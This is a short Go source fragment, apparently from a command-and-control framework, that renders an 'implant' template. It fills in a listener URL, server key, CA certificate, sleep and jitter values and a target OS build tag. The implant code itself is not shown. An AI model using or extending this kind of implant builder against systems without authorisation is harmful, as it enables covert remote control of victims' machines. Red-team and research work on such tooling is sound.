func RenderTemplate(cfg *BuildConfig) ([]byte, error) {
	tmpl, err := template.New("implant").Parse(implantTemplate)
	if err != nil {
		return nil, err
	}

	data := TemplateData{
		BuildID:         cfg.BuildID,
		BuiltAt:         cfg.CreatedAt.Format("2006-01-02 15:04:05"),
		GoBuildTag:      goBuildTag(cfg.TargetOS),
		ListenerURL:     cfg.ListenerURL,
		ProfileName:     cfg.ProfileName,
		ServerPubKey:    cfg.ServerPubKey,
		CACertPEMBase64: cfg.CACertPEMBase64,
		SleepSecs:       cfg.SleepSecs,
		JitterPerc:      cfg.JitterPerc,
		Format:          string(cfg.Format),
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, data); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func goBuildTag(os TargetOS) string {
	switch os {
	case TargetWindows:
		return "windows"
	case TargetLinux:
		return "linux"
	case TargetDarwin:
		return "darwin"
	default:
		return "ignore"
	}
}
